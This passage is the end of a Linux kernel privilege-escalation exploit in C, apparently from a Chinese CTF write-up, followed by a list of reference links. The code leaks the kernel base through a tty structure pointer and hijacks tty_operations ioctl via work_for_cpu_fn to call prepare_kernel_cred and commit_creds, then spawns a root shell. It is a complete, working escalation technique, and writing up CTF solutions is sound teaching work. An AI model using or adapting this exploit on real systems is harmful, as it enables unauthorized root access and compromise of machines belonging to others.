    uint64_t ops_ptr = *(uint64_t*)(buffer + 24);
    if ((ops_ptr & 0xfff) == (kOffset_ptm_unix98_ops & 0xfff)) {
      victim_idx = i;
      kernel_base = ops_ptr - kOffset_ptm_unix98_ops;
      kernel_slide = kernel_base - 0xFFFFFFFF81000000;
      break;
    }
  }

  if (!kernel_base) {
    printf("[-] Failed to leak kernel base\n");
    exit(EXIT_FAILURE);
  }

  printf("[+] kernel _text: %#lx\n", kernel_base);
  printf("[+] … or in other words, kernel slide: %#lx\n", kernel_slide);

  uint64_t prepare_kernel_cred = v_prepare_kernel_cred + kernel_slide;
  uint64_t prepare_creds = v_prepare_creds + kernel_slide;
  uint64_t commit_creds = v_commit_creds + kernel_slide;

  add_note(MAX_CATCHERS, 16, name);
  edit_note(MAX_CATCHERS, sizeof(struct tty_operations), name);
  memset(buffer, 0x41, sizeof(buffer));
  ((struct tty_operations*)buffer)->ioctl = v_work_for_cpu_fn + kernel_slide;
  write(fd, buffer, MAX_CATCHERS);

  gift();
  read(fd, buffer, victim_idx);
  uint64_t old_value_at_48 = *(uint64_t*)(buffer + 48);
  *(uint64_t*)(buffer + 24) = note_in_kernel[MAX_CATCHERS].mem;
  *(uint64_t*)(buffer + 32) = prepare_kernel_cred;
  *(uint64_t*)(buffer + 40) = 0;
  write(fd, buffer, victim_idx);

  // Boom
  for (int i = 0; i < MAX_PTY_SPRAY; i++) {
    ioctl(pty_masters[i], 233, 233);
  }

  read(fd, buffer, victim_idx);

  uint64_t new_value_at_48 = *(uint64_t*)(buffer + 48);
  printf("[+] prepare_creds() = %#lx\n", new_value_at_48);
  *(uint64_t*)(buffer + 32) = commit_creds;
  *(uint64_t*)(buffer + 40) = new_value_at_48;
  *(uint64_t*)(buffer + 48) = old_value_at_48;
  write(fd, buffer, victim_idx);

  // Boom
  for (int i = 0; i < MAX_PTY_SPRAY; i++) {
    ioctl(pty_masters[i], 233, 233);
  }
  printf("[=] getuid() = %d\n", getuid());

  if (getuid() == 0) {
    printf("[+] Pwned!\n");
    execlp("/bin/sh", "/bin/sh", NULL);
  }

  while (1);
  return 0;
}

```



## 参考链接

[1] https://www.cnblogs.com/LittleHann/p/4116368.html
[2] https://ctf.njupt.edu.cn/627.html
[3] https://www.bsi.bund.de/SharedDocs/Downloads/EN/BSI/Publications/Studies/LinuxRNG/LinuxRNG_EN.pdf?__blob=publicationFile&v=20
[4] https://www.jianshu.com/p/310eb3de3aa1
[5] https://www.anquanke.com/post/id/245271